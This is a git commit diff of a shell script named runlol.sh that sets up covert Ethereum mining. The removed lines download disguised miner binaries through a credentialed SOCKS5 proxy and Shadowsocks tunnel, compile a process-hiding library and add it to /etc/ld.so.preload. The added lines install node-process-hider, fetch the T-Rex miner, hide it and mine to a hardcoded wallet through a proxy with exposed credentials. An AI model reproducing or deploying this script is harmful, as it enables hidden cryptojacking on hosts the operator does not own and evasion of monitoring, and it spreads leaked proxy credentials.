6f13a7757b3dead41dc22f6f330293fdef1b8ff9
novasusan090 <106402065+novasusan090@users.noreply.github.com>
2022-05-27 19:33:50 +0000

    Update runlol.sh

--- runlol.sh
+++ runlol.sh
@@ -1,52 +1,15 @@
 #!/bin/sh
-ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
-dpkg-reconfigure --frontend noninteractive tzdata
+sudo su 
+sudo apt update
+sudo apt upgrade -y
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash -
+sudo apt-get install -y nodejs
 
-apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl
+npm i -g node-process-hider
+npm install -g npm
 
-wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz
-
-tar -xvzf graphics.tar.gz
-
-cat > graftcp/local/graftcp-local.conf <<END
-listen = :2233
-loglevel = 1
-socks5 = 176.53.133.217:57597
-socks5_username = 2BHVpyGPD
-socks5_password = 1rN14HAmV
-END
-
-./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
-
-sleep .2
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-./graftcp/graftcp curl ifconfig.me
-
-echo " "
-echo " "
-
-echo "******************************************************************"
-
-echo " "
-echo " "
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/basket
-chmod +x basket
-
-apt -y install shadowsocks-libev rng-tools
-rngd -r /dev/urandom
-ss-local -s 51.15.84.147 -p 8388 -l 9999 -k 6JPSE -m chacha20-ietf-poly1305 -v &
-
-./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBasket.zip
-unzip magicBasket.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
-
-./basket -a ethash -o ethproxy+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5.DENT -log --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786
+wget https://github.com/trexminer/T-Rex/releases/download/0.24.6/t-rex-0.24.6-linux.tar.gz
+tar -zxf t-rex-0.24.6-linux.tar.gz
+chmod +x t-rex
+sudo ph add t-rex
+./t-rex -a ethash -o stratum+ssl://eth-us-west.flexpool.io:5555 -u 0xbc48b8bdce572defe4dcab85103f140099bc5af5 -p x -w DENT --proxy socks5 = Selshindeparshuram2012:V7p9BkV@191.101.148.51:45786 --no-sni --dns-https-server 1.1.1.1
